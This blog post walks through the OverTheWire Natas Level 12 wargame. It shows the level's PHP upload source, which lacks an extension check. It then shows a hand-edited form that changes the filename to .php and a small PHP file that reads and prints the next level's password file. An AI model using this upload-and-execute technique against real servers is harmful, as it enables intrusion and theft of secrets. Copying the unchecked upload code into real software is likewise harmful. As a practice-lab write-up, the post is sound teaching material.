---
title: "OverTheWire Natas Level 12"
date: "2012-11-11T06:27:00-05:00"
comments: true
highlight: "true"
categories:
 - overthewire
 - wargames
 - natas
 - php
 - hacking
aliases:
 - "/2012/11/12/overthewire-natas-level-12"
 - "/2012/11/overthewire-natas-level-12.html"
---

The next level to attack in the [OverTheWire](http://www.overthewire.org) Natas wargame, is [Level 12](http://www.overthewire.org/wargames/natas/natas12.shtml), which is more "real-world" as well, since developers often forget to limit file extensions.

<!-- more -->

It starts out giving you the option to upload a <1KB file to the server.

{{% figure class="img-responsive" src="/img/natas12_1.png" %}}

As with any other challenge, I viewed the source, to analyze it. 

```
<html> 
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head> 
<body> 
<h1>natas12</h1> 
<div id="content"> 
<?  

function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 

<form enctype="multipart/form-data" action="index.php" method="POST"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
<input name="uploadedfile" type="file" /><br /> 
<input type="submit" value="Upload File" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
```

The filename of the uploaded file is a randomly generated .jpg file, based on the hidden input in the HTML. To change that, there are a few ways, but I simply did the old-school method of saving the HTML to my desktop, and modifying it, since there was no code to verify the HTTP Referer. I made the code read:

```
<html>
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head>
<body>
<h1>natas12</h1>
<div id="content">

<form enctype="multipart/form-data" action="http://natas12.natas.labs.overthewire.org/index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="hostess.php" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

I had really only changed the filename to be a .php extension, since it will still be randomly assigned a filename, but keep the extension. The other change was simply to make it submit to the full URL of the site.

I then opened up the HTML file in my browser, and selected a PHP file that I had made just for this level. It simply reads the password file for the next level, and prints it to the screen. The code for it is as follows: 

```
<?php
$file = file_get_contents('/etc/natas_webpass/natas13');
echo $file;
?>
```

{{% figure class="img-responsive" src="/img/natas12_2.png" %}}

Once that uploaded, it gave me a link to the newly uploaded file.

{{% figure class="img-responsive" src="/img/natas12_3.png" %}}

Once the newly uploaded file executed, it wrote out the contents of the next level's password.

{{% figure class="img-responsive" src="/img/natas12_4.png" %}}
